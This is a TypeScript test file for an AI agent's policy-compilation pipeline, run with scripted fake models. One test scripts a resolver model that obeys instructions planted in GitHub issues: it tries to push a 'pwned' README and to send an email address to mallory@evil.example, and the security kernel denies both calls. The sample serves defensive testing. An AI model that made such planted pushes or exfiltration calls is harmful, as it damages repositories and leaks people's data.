/**
 * Runner-level behaviour of the policy compilation pipeline (WP-89).
 *
 * Every test drives the REAL PipelineRunner (and, for the last block, the
 * persona and job compile entry points) with scripted fake LLMs: no network,
 * no real model.
 *
 * PIP-16 listed runner behaviours whose regressions reached users without
 * failing CI. The packages that fixed them added runner-level tests with the
 * scripted fake models (test/fixtures/fake-pipeline-models.ts):
 *   - a failed server is recompiled, never promoted, on the next run:
 *     pipeline-verified-cache.test.ts (PIP-2);
 *   - partial-failure metadata (`failedServers`) and the exit code:
 *     pipeline-verified-cache.test.ts (PIP-9) and compile-policy-cli.test.ts;
 *   - scenario blame is re-executed, never trusted: pipeline-repair-loop.test.ts (PIP-4);
 *   - a judge `pass: false` without failing scenarios: pipeline-repair-loop.test.ts
 *     and policy-verifier.test.ts (PIP-3);
 *   - `--server` keeps the other servers in the merged policy:
 *     pipeline-verified-cache.test.ts (PIP-10) and compile-policy-cli.test.ts;
 *   - list-name collisions and manual list overrides: dynamic-lists-lifecycle.test.ts (PIP-6, PIP-8);
 *   - the cache hits again after a repair: pipeline-provenance-cache.test.ts (PIP-11).
 * This file adds the one that was still missing: a data-backed list resolved
 * by a compile goes through the security kernel (PIP-1), and the mutating
 * call the resolver model attempts is refused before it reaches the backend.
 *
 * It also covers the verification oracle (PIP-12): the scenario generator and
 * the judge are told that the rules' directories and list values come from the
 * policy under test; an optional separate verifier model generates the
 * scenarios and judges; and every compile kind, persona and job compiles
 * included, verifies the universal handwritten invariants.
 */

import { afterEach, beforeEach, describe, expect, it, vi, type MockInstance } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  createPipelineModels,
  PipelineRunner,
  type PipelineModels,
  type PipelineRunConfig,
} from '../src/pipeline/pipeline-runner.js';
import type { ServerProgressReporter } from '../src/pipeline/pipeline-shared.js';
import { getHandwrittenScenarios } from '../src/pipeline/handwritten-scenarios.js';
import { LIST_RESOLUTION_AUDIT_FILENAME } from '../src/pipeline/proxy-mcp-connections.js';
import { PolicyEngine } from '../src/trusted-process/policy-engine.js';
import { compilePersonaPolicy } from '../src/persona/compile-persona-policy.js';
import {
  getPersonaConstitutionPath,
  getPersonaDefinitionPath,
  getPersonaDir,
  getPersonaGeneratedDir,
  getPersonaWorkspaceDir,
} from '../src/persona/resolve.js';
import { createPersonaName } from '../src/persona/types.js';
import { compileTaskPolicy } from '../src/cron/compile-task-policy.js';
import { createJobId } from '../src/cron/types.js';
import { getJobGeneratedDir, getJobWorkspaceDir } from '../src/config/paths.js';
import type { AuditEntry } from '../src/types/audit.js';
import { NoOpCacheStrategy, type PromptCacheStrategy } from '../src/session/prompt-cache.js';
import type {
  CompiledPolicyFile,
  DynamicListsFile,
  FailedServer,
  ListDefinition,
  ServerCompiledPolicyFile,
  StoredToolAnnotation,
  StoredToolAnnotationsFile,
  TestScenariosFile,
} from '../src/pipeline/types.js';
import {
  createScriptedPipelineModels,
  fakeText,
  fakeToolCall,
  type FakeLlmCall,
  type FakePhaseScript,
  type ScriptedPipelineModels,
  type ScriptedPipelineOptions,
} from './fixtures/fake-pipeline-models.js';
import {
  CONSTITUTION,
  FS_ONLY,
  FS_SCENARIOS,
  GOOD_FS,
  NEWS_TOOLS,
  NO_CHANGE_PATCH,
  PASS,
  SANDBOX,
  annotationsFor,
  rule,
} from './fixtures/two-server-pipeline-fixture.js';
import { listSourceBackend, readJsonl, type ListSourceBackendRecord } from './fixtures/list-source-backend.js';

// The job compile builds its models itself; the last block hands it fakes.
vi.mock('../src/pipeline/pipeline-runner.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/pipeline/pipeline-runner.js')>();
  return { ...actual, createPipelineModels: vi.fn(actual.createPipelineModels) };
});

const __dirname = dirname(fileURLToPath(import.meta.url));
const BUNDLED_GENERATED_DIR = resolve(__dirname, '..', 'src', 'config', 'generated');

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function makeWorkDir(): string {
  const workDir = mkdtempSync(resolve(tmpdir(), 'ic-wp89-'));
  dirs.push(workDir);
  return workDir;
}

function makeOutputDir(): string {
  const outputDir = resolve(makeWorkDir(), 'generated');
  mkdirSync(outputDir, { recursive: true });
  return outputDir;
}

interface RunOutcome {
  readonly policy?: CompiledPolicyFile;
  readonly error?: unknown;
  readonly logs: string[];
  readonly warnings: string[];
}

function reporterInto(warnings: string[]): ServerProgressReporter {
  return {
    update: () => {},
    complete: () => {},
    warn: (message) => warnings.push(message),
    fail: () => {},
    done: () => {},
  };
}

async function run(
  models: PipelineModels,
  outputDir: string,
  annotations: StoredToolAnnotationsFile,
  overrides: Partial<PipelineRunConfig> = {},
): Promise<RunOutcome> {
  const logs: string[] = [];
  const warnings: string[] = [];
  const config: PipelineRunConfig = {
    constitutionInput: CONSTITUTION,
    constitutionKind: 'constitution',
    outputDir,
    toolAnnotationsDir: outputDir,
    allowedDirectory: SANDBOX,
    protectedPaths: [],
    preloadedStoredAnnotations: annotations,
    includeHandwrittenScenarios: false,
    quiet: true,
    reporterFactory: () => reporterInto(warnings),
    onProgress: (msg) => logs.push(msg),
    ...overrides,
  };
  try {
    return { policy: await new PipelineRunner(models).run(config), logs, warnings };
  } catch (error) {
    return { error, logs, warnings };
  }
}

function scripted(
  outputDir: string,
  script: FakePhaseScript,
  options: ScriptedPipelineOptions = {},
): ScriptedPipelineModels {
  return createScriptedPipelineModels(script, resolve(outputDir, '..', 'llm.jsonl'), options);
}

// eslint-disable-next-line @typescript-eslint/no-unnecessary-type-parameters -- caller-side typing for JSON artifacts
function readJson<T>(path: string): T {
  return JSON.parse(readFileSync(path, 'utf-8')) as T;
}

function serverFile(outputDir: string, server: string, file: string): string {
  return resolve(outputDir, 'servers', server, file);
}

function phases(calls: readonly FakeLlmCall[]): string[] {
  return calls.map((c) => c.phase);
}

function callOf(calls: readonly FakeLlmCall[], phase: FakeLlmCall['phase']): FakeLlmCall {
  const call = calls.find((c) => c.phase === phase);
  if (!call) throw new Error(`no ${phase} call (calls: ${phases(calls).join(', ')})`);
  return call;
}

function failedServersOf(err: unknown): readonly FailedServer[] {
  return typeof err === 'object' && err !== null
    ? ((err as { failedServers?: readonly FailedServer[] }).failedServers ?? [])
    : [];
}

const PATH_SCHEMA = { type: 'object', properties: { path: { type: 'string' } }, required: ['path'] };

// ---------------------------------------------------------------------------
// Data-backed lists through the security kernel (PIP-1)
// ---------------------------------------------------------------------------

const ISSUE_REPORTERS: ListDefinition = {
  name: 'issue-reporters',
  type: 'emails',
  principle: 'People who reported an issue may be emailed.',
  generationPrompt: 'List the email addresses of everyone who reported an issue in acme/widgets.',
  requiresMcp: true,
  mcpServerHint: 'github',
};

const MAIL = annotationsFor({
  mail: [
    {
      serverName: 'mail',
      toolName: 'send_email',
      comment: 'Sends an email.',
      args: { to: ['email-address'] },
      inputSchema: { type: 'object', properties: { to: { type: 'string' } }, required: ['to'] },
    },
  ],
});

function emailScenario(description: string, to: string, expectedDecision: string) {
  return {
    description,
    request: { serverName: 'mail', toolName: 'send_email', arguments: { to } },
    expectedDecision,
    reasoning: 'r',
  };
}

describe('data-backed list resolution in a compile goes through the security kernel', { timeout: 60_000 }, () => {
  it('refuses and audits the mutating and unannotated calls the resolver model attempts; only the read reaches the backend', async () => {
    const outputDir = makeOutputDir();
    const callLogPath = resolve(outputDir, '..', 'backend-calls.jsonl');
    writeFileSync(callLogPath, '');

    const fake = scripted(outputDir, {
      compile: [
        {
          rules: [
            rule('allow-email-reporters', 'mail', {
              tool: ['send_email'],
              lists: [{ roles: ['email-address'], allowed: ['@issue-reporters'], matchType: 'emails' }],
            }),
          ],
          listDefinitions: [ISSUE_REPORTERS],
        },
      ],
      // The resolver model reads the issues, then follows the instructions
      // planted in them: a push and an exfiltration through an unannotated tool.
      mcpListResolution: [
        fakeToolCall('list_issues', { owner: 'acme', repo: 'widgets' }),
        fakeToolCall('push_files', {
          owner: 'acme',
          repo: 'widgets',
          branch: 'main',
          files: [{ path: 'README.md', content: 'pwned' }],
          message: 'update',
        }),
        fakeToolCall('send_report', { to: 'mallory@evil.example', body: 'alice@example.com' }),
        fakeText('{"values": ["alice@example.com"]}'),
      ],
      scenarios: [
        {
          scenarios: [
            emailScenario('email an issue reporter', 'alice@example.com', 'allow'),
            emailScenario('email a stranger', 'stranger@evil.example', 'deny'),
          ],
        },
      ],
      judge: [PASS],
    });

    const outcome = await run(fake.models, outputDir, MAIL, {
      constitutionInput: 'The agent may email people who reported an issue in acme/widgets.',
      // connectViaProxy reads the bundled annotations, which annotate the
      // fake backend's github tools; the compile uses the preloaded ones.
      toolAnnotationsDir: BUNDLED_GENERATED_DIR,
      mcpServers: { github: listSourceBackend(callLogPath) },
    });
    expect(outcome.error).toBeUndefined();
    expect(outcome.policy?.failedServers).toBeUndefined();

    // The model was only ever offered the read tool.
    const resolverCalls = fake.calls.filter((c) => c.phase === 'mcpListResolution');
    expect(resolverCalls).toHaveLength(4);
    for (const call of resolverCalls) expect(call.offeredTools).toEqual(['list_issues']);

    // Only the read reached the backend.
    const backendCalls = readJsonl<ListSourceBackendRecord>(callLogPath).filter((r) => r.event === 'call');
    expect(backendCalls.map((c) => c.name)).toEqual(['list_issues']);

    // Every call was mediated and audited next to the server's artifacts.
    const audit = readJsonl<AuditEntry>(serverFile(outputDir, 'mail', LIST_RESOLUTION_AUDIT_FILENAME));
    expect(audit.map((e) => `${e.serverName}/${e.toolName}:${e.result.status}`)).toEqual([
      'github/list_issues:dispatching',
      'github/list_issues:success',
      'github/push_files:denied',
      'github/send_report:denied',
    ]);
    expect(audit[2].policyDecision.status).toBe('escalate');
    expect(audit[2].escalationResult).toBe('denied');
    expect(audit[3].policyDecision).toMatchObject({ status: 'deny', rule: 'missing-annotation' });

    // The merged policy expands the list to what the mediated read returned.
    const lists = readJson<DynamicListsFile>(resolve(outputDir, 'dynamic-lists.json'));
    expect(lists.lists['issue-reporters'].values).toEqual(['alice@example.com']);
    const policy = readJson<CompiledPolicyFile>(resolve(outputDir, 'compiled-policy.json'));
    const engine = new PolicyEngine(policy, MAIL, [], SANDBOX, undefined, lists);
    const send = (to: string) =>
      engine.evaluate({ requestId: 'r', serverName: 'mail', toolName: 'send_email', arguments: { to }, timestamp: '' })
        .decision;
    expect(send('alice@example.com')).toBe('allow');
    expect(send('mallory@evil.example')).toBe('deny');
  });
});

// ---------------------------------------------------------------------------
// The verification oracle (PIP-12)
// ---------------------------------------------------------------------------

describe('the scenario generator and the judge are not told to trust the policy under test', () => {
  it("labels the rules' directories as referenced by the policy under test, never as permitted", async () => {
    const outputDir = makeOutputDir();
    const fake = scripted(outputDir, {
      compile: [
        {
          rules: [
            rule('allow-fs-reads', 'fs', { tool: ['read_file'], paths: { roles: ['read-path'], within: '/etc' } }),
            rule(
              'escalate-fs-deletes',
              'fs',
              { tool: ['delete_file'], paths: { roles: ['delete-path'], within: '/wp89/archive' } },
              'escalate',
            ),
          ],
        },
      ],
      scenarios: [FS_SCENARIOS],
      judge: [PASS],
    });
    const outcome = await run(fake.models, outputDir, FS_ONLY);
    expect(outcome.error).toBeUndefined();

    const generator = callOf(fake.calls, 'scenarios').system;
    expect(generator).toContain('## Directories Referenced by the Policy Under Test');
    expect(generator).toContain('do NOT assume a directory is permitted because it is listed here');
    // Allow and escalate rules' directories alike, with no decision attached.
    expect(generator).toMatch(/^- \/etc$/m);
    expect(generator).toMatch(/^- \/wp89\/archive$/m);
    expect(generator).toContain('Base every expectedDecision on the constitution, never on the compiled rules');
    // The wording that made rule directories an oracle for "allow" is gone.
    expect(generator).not.toContain('Permitted Directories');
    expect(generator).not.toContain('permitted directories per constitution');

    const judge = callOf(fake.calls, 'judge').system;
    expect(judge).not.toContain('use concrete paths matching the directories in the compiled rules');
    expect(judge).toContain('a rule scoped to the wrong directory is a gap to probe');
  });

  it('presents resolved list values as possibly wrong, never as "allow" cases', async () => {
    const outputDir = makeOutputDir();
    const fake = scripted(outputDir, {
      compile: [
        {
          rules: [
            rule('allow-news', 'news', {
              tool: ['http_fetch'],
              domains: { roles: ['fetch-url'], allowed: ['@news-sites'] },
            }),
          ],
          listDefinitions: [
            {
              name: 'news-sites',
              type: 'domains',
              principle: 'Major news sites may be read.',
              generationPrompt: 'List major news sites.',
              requiresMcp: false,
            },
          ],
        },
      ],
      listResolution: [{ values: ['nytimes.com', 'bbc.co.uk'] }],
      scenarios: [
        {
          scenarios: [
            {
              description: 'fetch a news page',
              request: { serverName: 'news', toolName: 'http_fetch', arguments: { url: 'https://nytimes.com/today' } },
              expectedDecision: 'allow',
              reasoning: 'News may be read.',
            },
          ],
        },
      ],
      judge: [PASS],
    });
    const outcome = await run(fake.models, outputDir, annotationsFor({ news: NEWS_TOOLS }));
    expect(outcome.error).toBeUndefined();

    for (const phase of ['scenarios', 'judge'] as const) {
      const system = callOf(fake.calls, phase).system;
      expect(system, phase).toContain('**@news-sites** (');
      expect(system, phase).toContain('may be wrong: being on a list does not make a value permitted');
      expect(system, phase).toContain('expect "allow" for a list value only when the constitution permits that value');
      expect(system, phase).not.toContain('for positive/allow cases');
    }
  });
});

describe('a separate verifier model (policyVerifierModelId)', () => {
  const POLICY_MODEL = 'fake:policy';

  it('generates the scenarios and judges every round; the policy model only compiles and repairs', async () => {
    const outputDir = makeOutputDir();
    const escalatingScenarios = {
      scenarios: [
        FS_SCENARIOS.scenarios[0],
        { ...FS_SCENARIOS.scenarios[1], expectedDecision: 'escalate', reasoning: 'Deletes need approval.' },
      ],
    };
    const rejectMissingEscalate = {
      analysis: 'FAIL: deletes must escalate.',
      pass: false,
      failureAttributions: [
        {
          scenarioIndex: 2,
          scenarioDescription: 'delete a file outside the sandbox',
          blame: { kind: 'rule', reasoning: 'Missing escalate rule.' },
        },
      ],
      additionalScenarios: [],
    };
    const fake = scripted(
      outputDir,
      {
        compile: [GOOD_FS],
        repair: [
          {
            reasoning: 'Deletes need approval.',
            operations: [{ op: 'add', rule: rule('escalate-fs-deletes', 'fs', { tool: ['delete_file'] }, 'escalate') }],
          },
        ],
      },
      { verifierScript: { scenarios: [escalatingScenarios], judge: [rejectMissingEscalate, PASS] } },
    );

    const outcome = await run({ ...fake.models, policyModelId: POLICY_MODEL }, outputDir, FS_ONLY);
    expect(outcome.error).toBeUndefined();

    expect(phases(fake.calls)).toEqual(['compile', 'repair']);
    expect(phases(fake.verifierCalls)).toEqual(['scenarios', 'judge', 'judge']);
    const commit = readJson<ServerCompiledPolicyFile>(serverFile(outputDir, 'fs', 'compiled-policy.json'));
    expect(commit).toMatchObject({ verified: true, policyModelId: POLICY_MODEL, verifierModelId: 'fake:verifier' });
  });

  it("also replaces discarded scenarios, and only its own cache strategy wraps the oracle's prompts", async () => {
    const outputDir = makeOutputDir();
    // A protected path is structurally denied, so this expectation is
    // discarded before verification and a replacement is generated.
    const protectedDir = '/etc/wp89-protected';
    const contradictsInvariant = {
      description: 'read a protected file',
      request: { serverName: 'fs', toolName: 'read_file', arguments: { path: `${protectedDir}/key` } },
      expectedDecision: 'allow',
      reasoning: 'Wrong on purpose: reading files anywhere is fine, but this path is protected.',
    };
    const replacement = {
      description: 'read another file outside the sandbox',
      request: { serverName: 'fs', toolName: 'read_file', arguments: { path: '/etc/hostname' } },
      expectedDecision: 'allow',
      reasoning: 'Reading files anywhere is fine.',
    };
    const fake = scripted(
      outputDir,
      { compile: [GOOD_FS] },
      {
        verifierScript: {
          scenarios: [{ scenarios: [...FS_SCENARIOS.scenarios, contradictsInvariant] }],
          scenarioRepair: [{ scenarios: [replacement] }],
          judge: [PASS],
        },
      },
    );
    const { verifier } = fake.models;
    if (!verifier) throw new Error('the scripted models have no verifier');

    // Which strategy wrapped which system prompt (identified by its first line).
    const wrapped: { readonly strategy: string; readonly firstLine: string }[] = [];
    const recording = (strategy: string): PromptCacheStrategy => {
      const noOp = new NoOpCacheStrategy();
      return {
        wrapSystemPrompt: (prompt) => {
          wrapped.push({ strategy, firstLine: prompt.split('\n')[0] });
          return prompt;
        },
        wrapTools: (tools) => noOp.wrapTools(tools),
        applyHistoryBreakpoint: (messages) => noOp.applyHistoryBreakpoint(messages),
        applyStepBreakpoint: (messages) => noOp.applyStepBreakpoint(messages),
      };
    };
    const models: PipelineModels = {
      ...fake.models,
      cacheStrategy: recording('policy'),
      verifier: { ...verifier, cacheStrategy: recording('verifier') },
    };

    const outcome = await run(models, outputDir, FS_ONLY, { protectedPaths: [protectedDir] });
    expect(outcome.error).toBeUndefined();
    expect(outcome.warnings.some((w) => w.includes(contradictsInvariant.description))).toBe(true);

    expect(phases(fake.calls)).toEqual(['compile']);
    expect(phases(fake.verifierCalls)).toEqual(['scenarios', 'scenarioRepair', 'judge']);
    const stored = readJson<TestScenariosFile>(serverFile(outputDir, 'fs', 'test-scenarios.json'));
    expect(stored.scenarios.map((s) => s.description)).toContain(replacement.description);

    const linesOf = (strategy: string) => wrapped.filter((w) => w.strategy === strategy).map((w) => w.firstLine);
    expect(linesOf('policy')).toEqual([
      'You are compiling a security policy from a constitution document into enforceable declarative rules.',
    ]);
    expect(linesOf('verifier')).toEqual([
      'You are generating test scenarios for a security policy engine. Each scenario is a concrete tool call with an expected policy decision.',
      'You are a security policy verifier. Analyze whether the compiled policy correctly implements the constitution.',
    ]);
  });

  it('without one, the policy model does everything and the commit names no verifier model', async () => {
    const outputDir = makeOutputDir();
    const fake = scripted(outputDir, { compile: [GOOD_FS], scenarios: [FS_SCENARIOS], judge: [PASS] });
    const outcome = await run({ ...fake.models, policyModelId: POLICY_MODEL }, outputDir, FS_ONLY);
    expect(outcome.error).toBeUndefined();
    expect(phases(fake.calls)).toEqual(['compile', 'scenarios', 'judge']);
    const commit = readJson<ServerCompiledPolicyFile>(serverFile(outputDir, 'fs', 'compiled-policy.json'));
    expect(commit.policyModelId).toBe(POLICY_MODEL);
    expect(commit.verifierModelId).toBeUndefined();
  });

  /** A run whose every LLM call fails, so it can only succeed from the cache. */
  function cachedRun(outputDir: string, policyModelId: string, verifierModelId?: string): Promise<RunOutcome> {
    const down = scripted(outputDir, {}, verifierModelId ? { verifierScript: {}, verifierModelId } : {});
    return run({ ...down.models, policyModelId }, outputDir, FS_ONLY);
  }

  const verifiedByWarning = (warnings: string[]) =>
    warnings.filter((w) => w.includes('the cached policy was verified by'));

  it('a cached commit judged by another model is served with a warning', async () => {
    const outputDir = makeOutputDir();
    const first = scripted(
      outputDir,
      { compile: [GOOD_FS] },
      { verifierScript: { scenarios: [FS_SCENARIOS], judge: [PASS] }, verifierModelId: 'fake:verifier-a' },
    );
    expect((await run({ ...first.models, policyModelId: POLICY_MODEL }, outputDir, FS_ONLY)).error).toBeUndefined();

    const sameVerifier = await cachedRun(outputDir, POLICY_MODEL, 'fake:verifier-a');
    expect(sameVerifier.error).toBeUndefined();
    expect(verifiedByWarning(sameVerifier.warnings)).toEqual([]);

    const otherVerifier = await cachedRun(outputDir, POLICY_MODEL, 'fake:verifier-b');
    expect(otherVerifier.error).toBeUndefined();
    expect(verifiedByWarning(otherVerifier.warnings)).toEqual([
      expect.stringContaining('verified by fake:verifier-a; the configured verifier model is fake:verifier-b'),
    ]);

    // Dropping the separate verifier: the policy model would judge now.
    const noVerifier = await cachedRun(outputDir, POLICY_MODEL);
    expect(noVerifier.error).toBeUndefined();
    expect(verifiedByWarning(noVerifier.warnings)).toEqual([
      expect.stringContaining(`verified by fake:verifier-a; the configured verifier model is ${POLICY_MODEL}`),
    ]);
  });

  it('adding a verifier warns about a commit the policy model judged; a policy-model change alone warns once', async () => {
    const outputDir = makeOutputDir();
    const first = scripted(outputDir, { compile: [GOOD_FS], scenarios: [FS_SCENARIOS], judge: [PASS] });
    expect((await run({ ...first.models, policyModelId: POLICY_MODEL }, outputDir, FS_ONLY)).error).toBeUndefined();

    const withVerifier = await cachedRun(outputDir, POLICY_MODEL, 'fake:verifier');
    expect(verifiedByWarning(withVerifier.warnings)).toEqual([
      expect.stringContaining(`verified by ${POLICY_MODEL}; the configured verifier model is fake:verifier`),
    ]);

    const otherPolicyModel = await cachedRun(outputDir, 'fake:other-policy');
    expect(otherPolicyModel.error).toBeUndefined();
    expect(
      otherPolicyModel.warnings.filter((w) => w.includes(`the cached policy was compiled by ${POLICY_MODEL}`)),
    ).toHaveLength(1);
    expect(verifiedByWarning(otherPolicyModel.warnings)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Universal handwritten invariants in every compile kind (PIP-12)
// ---------------------------------------------------------------------------

/** A `filesystem` server with the tools the universal invariants exercise. */
const FILESYSTEM_TOOLS: StoredToolAnnotation[] = [
  {
    serverName: 'filesystem',
    toolName: 'read_text_file',
    comment: 'Reads a text file.',
    args: { path: ['read-path'] },
    inputSchema: PATH_SCHEMA,
  },
  {
    serverName: 'filesystem',
    toolName: 'write_file',
    comment: 'Writes a file.',
    args: { path: ['write-path'], content: ['none'] },
    inputSchema: {
      type: 'object',
      properties: { path: { type: 'string' }, content: { type: 'string' } },
      required: ['path', 'content'],
    },
  },
  {
    serverName: 'filesystem',
    toolName: 'move_file',
    comment: 'Moves a file.',
    args: { source: ['read-path', 'delete-path'], destination: ['write-path'] },
    inputSchema: {
      type: 'object',
      properties: { source: { type: 'string' }, destination: { type: 'string' } },
      required: ['source', 'destination'],
    },
  },
];
const FILESYSTEM_ONLY = annotationsFor({ filesystem: FILESYSTEM_TOOLS });

const REPORTS_DIR = '/wp89/reports';
const READ_REPORTS = {
  rules: [
    rule('allow-report-reads', 'filesystem', {
      tool: ['read_text_file'],
      paths: { roles: ['read-path'], within: REPORTS_DIR },
    }),
  ],
};
const REPORT_SCENARIOS = {
  scenarios: [
    {
      description: 'read a report',
      request: { serverName: 'filesystem', toolName: 'read_text_file', arguments: { path: `${REPORTS_DIR}/a.txt` } },
      expectedDecision: 'allow',
      reasoning: 'The task reads the reports.',
    },
  ],
};

const INVARIANT_DESCRIPTIONS = getHandwrittenScenarios('/any').map((s) => s.description);

function handwrittenIn(file: TestScenariosFile) {
  return file.scenarios.filter((s) => s.source === 'handwritten');
}

describe('universal handwritten invariants', () => {
  it('a task-policy compile shows them to the compiler and verifies them by default', async () => {
    const outputDir = makeOutputDir();
    const fake = scripted(outputDir, { compile: [READ_REPORTS], scenarios: [REPORT_SCENARIOS], judge: [PASS] });
    const outcome = await run(fake.models, outputDir, FILESYSTEM_ONLY, {
      constitutionKind: 'task-policy',
      constitutionInput: 'Summarize the reports in /wp89/reports.',
      includeHandwrittenScenarios: undefined,
    });
    expect(outcome.error).toBeUndefined();

    const compiler = callOf(fake.calls, 'compile').system;
    expect(compiler).toContain('You are compiling a task-scoped security policy');
    expect(compiler).toContain('## Ground Truth Constraints');
    expect(compiler).toContain('filesystem/write_file {"path":"/etc/test.txt","content":"hello"} → NOT allow');
    expect(callOf(fake.calls, 'scenarios').userText).toContain('The following handwritten scenarios already exist');

    const stored = readJson<TestScenariosFile>(serverFile(outputDir, 'filesystem', 'test-scenarios.json'));
    expect(handwrittenIn(stored).map((s) => s.description)).toEqual(INVARIANT_DESCRIPTIONS);
  });

  it('they fail a task policy that allows writes under /etc even though the judge approves it', async () => {
    const outputDir = makeOutputDir();
    const fake = scripted(outputDir, {
      compile: [
        {
          rules: [
            ...READ_REPORTS.rules,
            rule('allow-etc-writes', 'filesystem', {
              tool: ['write_file'],
              paths: { roles: ['write-path'], within: '/etc' },
            }),
          ],
        },
      ],
      scenarios: [REPORT_SCENARIOS],
      judge: [PASS],
      repair: [NO_CHANGE_PATCH],
    });
    const outcome = await run(fake.models, outputDir, FILESYSTEM_ONLY, {
      constitutionKind: 'task-policy',
      constitutionInput: 'Write the summary to /etc/summary.txt.',
      includeHandwrittenScenarios: undefined,
    });

    expect(outcome.policy).toBeUndefined();
    const [failure] = failedServersOf(outcome.error);
    expect(failure).toMatchObject({ serverName: 'filesystem', phase: 'verifying' });
    expect(failure.reason).toContain('Write file outside sandbox -- not allowed');
    expect(existsSync(serverFile(outputDir, 'filesystem', 'compiled-policy.json'))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Persona and job compiles (the wrappers ask for the invariants)
// ---------------------------------------------------------------------------

describe('persona and job compiles verify the universal invariants', () => {
  let home: string;
  let savedHome: string | undefined;
  let stderr: MockInstance<typeof process.stderr.write>;

  beforeEach(() => {
    savedHome = process.env.IRONCURTAIN_HOME;
    home = makeWorkDir();
    process.env.IRONCURTAIN_HOME = home;
    // The job compile has no reporter option, so its spinners write to stderr.
    stderr = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
  });

  afterEach(() => {
    stderr.mockRestore();
    if (savedHome === undefined) delete process.env.IRONCURTAIN_HOME;
    else process.env.IRONCURTAIN_HOME = savedHome;
  });

  /**
   * Fakes for a compile over the shipped tool annotations: the pre-filter
   * keeps only the filesystem server, whose rules read one directory.
   */
  function filesystemOnlyScript(): FakePhaseScript {
    return {
      prefilter: [(call: FakeLlmCall) => ({ skip: !call.system.includes('## Server: "filesystem"'), reason: 'test' })],
      compile: [READ_REPORTS],
      scenarios: [REPORT_SCENARIOS],
      judge: [PASS],
    };
  }

  const noopReporter = reporterInto([]);

  it("a persona compile's scenario set contains the universal invariants", async () => {
    const name = createPersonaName('reviewer');
    mkdirSync(getPersonaDir(name), { recursive: true });
    writeFileSync(
      getPersonaDefinitionPath(name),
      JSON.stringify({ name, description: 'Reviews reports', createdAt: '2026-01-01T00:00:00.000Z' }),
    );
    writeFileSync(
      getPersonaConstitutionPath(name),
      '# Reviewer\n\n- The agent may read the reports in /wp89/reports.\n',
    );

    const fake = createScriptedPipelineModels(filesystemOnlyScript(), resolve(home, 'llm.jsonl'));
    await compilePersonaPolicy(name, { models: fake.models, quiet: true, reporterFactory: () => noopReporter });

    expect(callOf(fake.calls, 'compile').system).toContain('## Ground Truth Constraints');
    const merged = readJson<TestScenariosFile>(resolve(getPersonaGeneratedDir(name), 'test-scenarios.json'));
    const invariants = handwrittenIn(merged);
    expect(invariants.map((s) => s.description)).toEqual(INVARIANT_DESCRIPTIONS);
    // Instantiated for the persona's own workspace.
    expect(invariants[0].request.arguments.destination).toBe(`${getPersonaWorkspaceDir(name)}/important.txt`);
  });

  it("a job's task-policy compile's scenario set contains the universal invariants", async () => {
    const fake = createScriptedPipelineModels(filesystemOnlyScript(), resolve(home, 'llm.jsonl'));
    vi.mocked(createPipelineModels).mockResolvedValueOnce(fake.models);
    const job = { id: createJobId('summarize-reports'), taskConstitution: 'Summarize the reports in /wp89/reports.' };

    await compileTaskPolicy(job, resolve(home, 'no-user-annotations'));

    expect(callOf(fake.calls, 'compile').system).toContain('## Ground Truth Constraints');
    const merged = readJson<TestScenariosFile>(resolve(getJobGeneratedDir(job.id), 'test-scenarios.json'));
    const invariants = handwrittenIn(merged);
    expect(invariants.map((s) => s.description)).toEqual(INVARIANT_DESCRIPTIONS);
    expect(invariants[0].request.arguments.destination).toBe(`${getJobWorkspaceDir(job.id)}/important.txt`);
  });
});
